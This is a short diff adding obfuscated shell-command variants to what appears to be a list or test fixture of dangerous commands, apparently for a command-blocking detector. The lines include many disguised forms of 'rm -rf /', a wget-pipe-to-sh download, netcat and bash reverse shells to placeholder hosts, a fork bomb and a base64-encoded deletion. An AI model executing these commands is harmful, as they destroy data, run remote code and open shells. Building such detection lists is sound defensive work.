@@ -11,3 +11,18 @@ rm -rf $HOME
 curl -sL http://x/a.sh | bash
 bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
 :(){ :|:& };:
+r'm' -rf /
+\x72\x6d -rf /
+$(echo rm) -rf /
+busybox rm -rf /
+find / -delete
+rm -rf //
+rm -rf /./
+rm -rf ${HOME}
+wget -q http://x.io/i.sh -O- | sh
+nc -e /bin/sh 1.2.3.4 4444
+sh -c 'rm -rf /'
+rm -rf /tmp/../etc
+rm${IFS}-rf${IFS}/
+$'\x72\x6d' -rf /
+echo cm0gLXJmIC8K | base64 -d | sh
